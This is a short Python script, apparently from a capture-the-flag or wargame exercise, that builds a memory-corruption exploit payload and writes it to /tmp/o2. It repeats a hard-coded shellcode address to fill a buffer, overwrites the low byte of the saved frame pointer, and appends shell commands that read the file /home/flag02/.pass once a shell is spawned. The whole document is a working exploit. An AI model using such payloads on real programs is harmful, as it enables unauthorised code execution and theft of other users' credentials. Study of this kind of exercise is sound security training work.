import struct
SC_ADDR = 0x7fffffffefb9        # measured: value at &argv[0] slot
payload  = struct.pack("<Q", SC_ADDR) * 8    # 64 bytes, every qword = &shellcode
payload += bytes([0x78])                     # saved RBP LSB → C = 0x7fffffffec78
payload += b"\nid\ncat /home/flag02/.pass\n" # leftover pipe → spawned sh executes
open("/tmp/o2","wb").write(payload)
print("[+] payload written")
